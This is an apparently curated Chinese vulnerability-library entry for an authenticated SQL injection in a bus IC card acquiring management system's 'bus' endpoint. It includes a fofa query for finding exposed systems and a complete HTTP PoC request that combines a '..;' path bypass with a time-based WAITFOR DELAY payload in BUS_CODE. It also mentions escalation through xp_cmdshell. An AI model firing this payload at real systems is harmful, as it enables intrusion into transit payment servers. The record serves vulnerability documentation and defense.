---
source: "wy876 漏洞文库"
title: "天津环球磁卡公交IC卡收单管理 bus BUS_CODE SQL注入"
product: "天津环球磁卡公交IC卡收单管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "明确已认证且有Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rs9z40892wvgac14"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%8E%AF%E7%90%83%E7%A3%81%E5%8D%A1/%E5%85%AC%E4%BA%A4IC%E5%8D%A1%E6%94%B6%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fbus%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"公交IC卡收单管理系统\""
id: "vw-007ac29a15c4b9a18ec4fab7"
entity_id: "ve-007ac29a15c4b9a18ec4fab7"
schema_version: "1"
---

# 天津环球磁卡公交IC卡收单管理 bus BUS_CODE SQL注入

## 条目说明

- 对象与具体问题：天津环球磁卡公交IC卡收单管理；bus BUS_CODE SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：明确已认证且有Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目录环球磁卡与前305–310天津公司同产品树，统一分类；bus为独立接口不删
- 5秒无基线/返回，assets/..；是否绕过要另证；xp_cmdshell后果条件化
- 缺版本/修复/源码，HTTP错标Java

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
公交IC卡收单管理系统是城市公共交通领域中不可或缺的一部分，它通过集成先进的集成电路技术（IC卡）实现了乘客便捷的支付方式，并有效提高了公共交通运营效率。系统集成了发卡、充值、消费、数据采集、查询和注销等多个功能模块，为公交公司和乘客提供了全面、高效、便捷的公共交通支付解决方案。该系统不仅提升了乘客的出行体验，还降低了公交公司的运营成本，提高了管理效率。公交IC卡收单管理系统bus存在SQL注入漏洞。经过身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## 二、影响版本
+ 公交IC卡收单管理系统

## 三、资产测绘
+ fofa`app="公交IC卡收单管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /assets/..;/bus HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: JSESSIONID=B******************************C
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 
_search=false&nd=1727248354972&rowCountPerPage=10&pageNo=1&sidx=BUS_CODE&sord=asc&method=select&BUS_CODE=1');WAITFOR DELAY '0:0:5'--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rs9z40892wvgac14>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
